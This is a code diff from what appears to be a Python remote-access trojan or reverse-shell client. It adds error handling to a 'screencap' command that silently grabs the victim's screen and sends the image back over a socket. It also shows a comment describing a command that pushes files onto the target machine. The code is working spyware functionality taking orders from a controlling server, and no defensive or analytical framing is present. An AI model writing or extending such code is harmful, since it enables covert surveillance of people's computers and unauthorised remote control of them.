@@ -131,13 +131,20 @@ def shell(mySocket):
                 mySocket.send(informToServer.encode())
 
         elif 'screencap' == commandList[0]:
-            tempPath = tempfile.mkdtemp()
-            fileName = 'img.jpg'
-            fullPath = os.path.join(tempPath, fileName)
+            try:
+                tempPath = tempfile.mkdtemp()
+                fileName = 'img.jpg'
+                fullPath = os.path.join(tempPath, fileName)
 
-            ImageGrab.grab().save(fullPath, "JPEG")
-            sendFile(mySocket, fullPath)
-            shutil.rmtree(tempPath)
+                ImageGrab.grab().save(fullPath, "JPEG")
+                sendFile(mySocket, fullPath)
+                shutil.rmtree(tempPath)
+            except Exception as e:
+                mySocket.send('ERROR'.encode())
+                informToServer = "[+] Some error occured. " + str(e)
+                mySocket.send(informToServer.encode())
+
+
 
         #command format: send*<destination path>*<File Name>
         # example: send*C:\Users\John\Desktop\*photo.jpeg 
